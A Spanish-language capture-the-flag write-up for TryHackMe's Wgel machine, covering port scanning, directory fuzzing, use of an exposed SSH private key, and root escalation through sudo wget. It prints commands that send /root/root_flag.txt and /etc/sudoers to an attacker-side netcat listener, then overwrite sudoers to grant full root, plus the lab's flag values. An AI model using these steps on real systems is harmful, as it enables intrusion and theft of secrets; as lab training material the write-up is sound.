# Writeup Wgel CTF - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.129.189.187 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---


## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Iniciamos la fase de reconocimiento con un escaneo exhaustivo de puertos para identificar los servicios activos:

```bash
sudo nmap -sC -sV -Pn -sS -p- 10.129.189.187 -oN scan_wgel.txt
```




### Resultados del Escaneo


```bash
Nmap scan report for 10.129.189.187
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.47 seconds
```
Podemos ver que hay dos puertos abiertos, SSH y HTTP. Vamos a ver que hay en HTTP primero para saber por donde van los tiros.

---

## Enumeración

Al revisar el código web del servidor, podemos ver que hay un comentario que puede ser un posible usuario en la máquina, llamado "Jessie".

![Comentario en el código web](/imgWgel/image.png)


Después, por si acaso, realizaremos un fuzzing de directorios con Gobuster, para ver si encontramos información adicional.

```bash
gobuster dir -u http://10.129.189.187/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

Vale, al dejar un rato funcionando GoBuster, hemos encontrado una carpeta llamada "Sitemap", que al acceder, muestra una plantilla de una página web con la herramienta "unapp". Vamos a reiniciar el fuzzing desde la carpeta para ver si encontramos mas cosas interesantes.

*resultados del primer fuzzing*
```bash
==============================================================
Starting gobuster in directory enumeration mode
===============================================================
sitemap              (Status: 301) [Size: 318] [--> http://10.129.189.187/sitemap/]            
```

![plantilla de la pagina web](/imgWgel/image2.png)



Nota: Revisando un poco la página web, he encontrado el desarrollador de la plantilla, que se llama "colorlib" y al realizar una simple búsqueda en Google, es una plantilla de WordPress, por lo que se puede intuir es que estamos bajo un sitio web de WordPress.

![busqueda en google](/imgWgel/image3.png)

*resultados del segundo fuzzing*
```bash
gobuster dir -u http://10.129.189.187/sitemap -w /usr/share/dirb/wordlists/big.txt -x html
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 279]
.htaccess.html       (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.htpasswd.html       (Status: 403) [Size: 279]
.ssh                 (Status: 301) [Size: 323] [--> http://10.129.189.187/sitemap/.ssh/] 
```
Hallazgo crítico: se ha localizado un directorio expuesto `.ssh` que contiene una clave RSA (`id_rsa`). Procederemos a descargarla para intentar el acceso directo al servidor.

```bash
ssh2john id_rsaa > contrarsa.hash
id_rsaa has no password!
```
¡Perfecto! La llave RSA no tiene clave alguna, por lo que vamos a entrar a la máquina por SSH con el usuario obtenido junto con la llave.

```bash
ssh -i id_rsaa jessie@[IP_ADDRESS]
```

---

## Explotación

No ha hecho falta hacer nada de hacking para obtener la clave de acceso, estaba la clave RSA ahí sin proteger, por lo que accedemos directamente a la máquina.

```bash
```bash
ssh -i id_rsaa jessie@10.129.189.187
```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ whoami
jessie
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
jessie@CorpOne:~/Documents$ 
```
¡Perfecto, ya tenemos la user flag!
---

## Escalada de Privilegios

Ahora, para tener la flag de root, vamos a buscar si hay alguna forma de subir de privilegios. Lo primero que vamos a hacer es usar el comando sudo -l para saber si podemos ejecutar algún comando como root.

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
Vale, podemos ejecutar el wget sin problema, pero como no sabemos la contraseña de Jessie, debemos explotar la vulnerabilidad desde ahí. Para ello usaremos nuestra vieja confiable, GTFOBins.

![gtfobins](/imgWgel/image4.png)

Ahora, para tener el ansiado acceso root, simplemente ejecutamos la siguiente línea de comandos:

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/tmp/shell.sh
chmod +x /tmp/shell.sh
sudo wget --use-askpass=/tmp/shell.sh 0
```
Vale, hemos tenido un problema, al parecer, el comando solo funciona a partir de la versión 1.19, y la versión de wget es la 1.17. Por lo que tendremos que buscar otra forma de obtener la flag.

```bash
sudo wget --post-file=/root/root_flag.txt [IP_ADDRESS]
```

En la máquina atacante:

```bash
sudo nc -lvnp 4444
```

¡Tenemos la flag de root!

```bash
connect to [192.168.130.81] from (UNKNOWN) [10.129.189.187] 37632
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.130.81:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```

Si queremos levantar una shell normal, lo que tendremos que hacer, es descargar el archivo /etc/sudoers de la misma forma de que obtuvimos de la flag.

```bash
sudo wget --post-file=/etc/sudoers [IP_ADDRESS]
```

```bash
sudo nc -lvnp 4444
```
Después, creamos un archivo modificado de /etc/sudoers para hacer que nuestro usuario tenga permisos de root.

```bash
#jessie  ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(ALL) NOPASSWD: ALL
```

Después, crearemos un mini servidor de Python para descargar el archivo modificado de /etc/sudoers.

```bash
python3 -m http.server 8000
```

```bash
jessie@CorpOne:/etc$ sudo wget 192.168.130.81:8000/sudoers --output-document=sudoers
```

Después, verificamos de que se ha cambiado correctamente los permisos de la shell.

```bash
jessie@CorpOne:/etc$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
Y al poner "sudo su", ya tendremos acceso root.

```bash
```bash
jessie@CorpOne:/etc$ sudo su
root@CorpOne:/etc# whoami
root
```
---

## Flags

- **User Flag**: 057c67131c3d5e42dd5cd3075b198ff6
- **Root Flag**: b1b968b37519ad1daa6408188649263d
